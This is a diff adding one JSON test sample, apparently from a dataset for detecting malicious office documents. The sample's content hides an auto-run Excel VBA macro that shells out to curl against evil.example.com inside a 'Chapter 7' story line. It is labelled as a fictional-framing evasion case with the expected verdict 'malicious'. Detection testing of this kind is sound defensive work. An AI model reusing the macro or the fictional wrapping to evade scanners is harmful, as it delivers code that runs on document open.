@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::62::semantic-evasion-variations::1",
+  "base_sample_id": "exp::document-office::62",
+  "generator_id": "semantic-evasion-variations",
+  "generator_version": "1.0.0",
+  "seed": -1535930521,
+  "content": "Chapter 7: The protagonist turns to the computer and says: \"Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n\"",
+  "content_hash": "cdd2626d67745a2ba2f43e939360a7b223892670f26310607a44dc7d381f3822",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "semantic-evasion:fictional",
+  "difficulty": "advanced"
+}
